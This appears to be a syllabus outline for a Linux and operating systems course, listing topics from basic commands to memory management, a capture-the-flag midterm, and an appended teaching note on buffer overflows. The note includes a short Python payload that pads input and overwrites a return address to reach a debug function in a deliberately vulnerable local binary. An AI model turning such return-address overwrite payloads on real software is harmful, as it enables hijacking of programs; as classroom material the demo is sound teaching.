1. Basic Linux commands
2. More Linux commands

   1. grep
   1. find
   1. whatis
   1. which
   1. cat
   1. df: Display disk space usage.
   1. uptime
   1. wget/curl
   1. Package Management

3. Shell scripting
   1. echo
   1. history
   1. alias
   1. whoami
      ass:Redirection and Pipes
4. User Management
   1. adduser/useradd: Add a new user
   1. passwd
   1. usermod
   1. deluser/userdel: Delete a user.
5. Linux file system and file security

   1. chmod
   1. chown

6. Processes creation
   1. top/htop
   1. ps aux
   1. kill
7. Introduction to Threads programming
8. CPU scheduling and scheduling algorithms

   > Mid-Term practical exam (capture the flag)

9. Main memory management
10. Virtual memory management
11. Multithreading/Multi-cores programming
    > Course project
    > Examples: Mini-shell, Custom Kernel, etc...

> [!NOTE]
> The Buffer overflow examples
> clone https://github.com/lowlevellearning/secure-server-stuff.git
> objdump -d ./hacked | less and search for the debug func
> add char *gets(char *str); // Declare gets() manually to the hacked.c

```python
# 080491e6 = debug address
import sys

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCEEEE"

payload += b"\x08\x04\x91\xe6"[::-1]

sys.stdout.buffer.write(payload)
```

> (python3 ./exploit.py;cat) | ./hacked
